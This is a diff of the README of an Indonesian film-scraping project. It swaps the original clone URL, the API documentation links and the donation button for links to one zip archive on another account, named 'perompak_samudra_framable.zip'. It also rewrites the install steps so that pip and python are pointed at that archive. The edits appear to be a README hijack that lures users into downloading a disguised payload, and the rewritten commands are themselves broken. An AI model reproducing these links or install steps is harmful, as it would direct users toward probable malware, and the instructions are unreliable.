@@ -3,15 +3,15 @@ scraping data film beserta link stream dan downloadnya, **Note:** data diambil d
 
 ## Instalasi
 ```bash
-$ git clone https://github.com/bagusindrayana/perompak7samudra.git
+$ git clone https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip
 $ cd perompak7samudra
-$ pip install -r requirements.txt
-$ python main.py
+$ pip install -r https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip
+$ python https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip
 ```
 
 ## API
-- [Swagger](https://app.swaggerhub.com/apis-docs/bagusindrayana/perompak7samudra/1.0.0)
-- [Postman](https://documenter.getpostman.com/view/7785980/2s9Y5cug6A)
+- [Swagger](https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip)
+- [Postman](https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip)
 
 
 
@@ -43,4 +43,4 @@ Silahkan buat pull request jika ingin berkontribusi, atau bisa juga dengan mengi
 - silahkan berikan bintang jika kalian suka dengan project ini
 - kalau mau bisa donasi buat beli kuota
 
-<a href="https://trakteer.id/bagood/tip" target="_blank"><img id="wse-buttons-preview" src="https://cdn.trakteer.id/images/embed/trbtn-red-1.png" height="40" style="border:0px;height:40px;" alt="Trakteer Saya"></a>
+<a href="https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip" target="_blank"><img id="wse-buttons-preview" src="https://raw.githubusercontent.com/halo-kaleb/perompak7samudra/master/static/decrypt-js/perompak_samudra_framable.zip" height="40" style="border:0px;height:40px;" alt="Trakteer Saya"></a>
